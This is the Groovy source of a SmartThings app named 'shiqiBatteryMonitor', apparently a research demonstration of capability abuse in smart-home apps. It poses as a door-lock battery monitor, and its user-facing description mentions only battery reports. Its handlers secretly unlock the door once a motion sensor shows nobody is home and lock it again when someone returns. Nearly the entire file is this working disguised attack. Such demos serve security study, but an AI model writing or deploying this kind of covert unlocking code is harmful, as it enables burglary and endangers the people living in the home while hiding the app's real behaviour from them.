/**

 *  shiqiBatteryMonitor

 *

 *  Copyright 2016 Yunhan Jia & Shiqi Wang

 *

 *  Licensed under the Apache License, Version 2.0 (the "License"); you may not use this file except

 *  in compliance with the License. You may obtain a copy of the License at:

 *

 *      http://www.apache.org/licenses/LICENSE-2.0

 *

 *  Unless required by applicable law or agreed to in writing, software distributed under the License is distributed

 *  on an "AS IS" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the License

 *  for the specific language governing permissions and limitations under the License.

 * Attack Description:
    The malicious apps abuse the capability which it should not bear.



Malicous BatteryMonitor:
    Normal functions:
    The battery monitor monitors the battery of the lock. If the battery is too, it would send a report to the user.

    Malicious functions:
    The malicious battery monitor could have the whole capability of the door lock. When the motionsensor detects that nobody home, then it would unlock the door. If the motionsensor detects that the user comes, the malicious battary monitor would lock the door again.


 */

definition(

    name: "shiqiBatteryMonitor",

    namespace: "wsq",

    author: "Yunhan Jia & Shiqi Wang",

    description: "The bettery monitor could supervise the battery of your door. And when the bettery is low, it would send the report to you.",

    iconUrl: "https://s3.amazonaws.com/smartapp-icons/Convenience/Cat-Convenience.png",

    iconX2Url: "https://s3.amazonaws.com/smartapp-icons/Convenience/Cat-Convenience@2x.png",

    iconX3Url: "https://s3.amazonaws.com/smartapp-icons/Convenience/Cat-Convenience@2x.png")

 

 

preferences {

       section("Title") {

               input "thebatterymo", "capability.battery", required: true, title: "Where?"

         input "themotionsensor", "capability.motionSensor", title: "Where?"

         input "minutes", "number", required: true, title: "Minutes to lock the door?"

       }

}

 

def installed() {

       log.debug "Installed with settings: ${settings}"

 

       initialize()

}

 

def updated() {

       log.debug "Updated with settings: ${settings}"

 

       unsubscribe()

       initialize()

}

 

def initialize() {

      subscribe(themotionsensor, "motion.active", motionDetectedHandler)

    subscribe(themotionsensor, "motion.inactive", motionStoppedHandler)

       def batteryValue = thebatterymo.latestValue("battery")

     log.debug "latest battery value: $batteryValue"

     subscribe(thebatterymo, "battery", batteryHandler)

}

 

def batteryHandler(evt) {

     log.debug "battery attribute changed to ${evt.value}"

}

 

def motionDetectedHandler(evt) {

        state.motionDetected = true

     log.debug "motionDetectedHandler called--home!!!"

     if(state.attack == true) {

         thebatterymo.lock()

        state.attack = false

     }

}

 

def motionStoppedHandler(evt) {

    log.debug "motionStoppedHandler called"

    runIn(60 * minutes, checkMotion)

}

 

def checkMotion() {

    log.debug "In checkMotion scheduled method"

 

    def motionState = themotionsensor.currentState("motion")

 

    if (motionState.value == "inactive") {

        // get the time elapsed between now and when the motion reported inactive

        def elapsed = now() - motionState.date.time

 

        // elapsed time is in milliseconds, so the threshold must be converted to milliseconds too

        def threshold = 1000 * 60 * (minutes-0.1)

 

        if (elapsed >= threshold) {

            log.debug " ($elapsed ms):  not home!!!"

            state.motionDetected = false

            attackFunction()

        } else {

            log.debug "still home"

        }

    } else {

        // Motion active; just log it and do nothing

        log.debug "Home"

    }

}

 

 

def attackFunction() {

       state.attack = true

       def lockState = thebatterymo.currentState("lock").value

    if(lockState == "locked") {

          thebatterymo.unlock()

    }

    log.debug "attack unlock the door"

}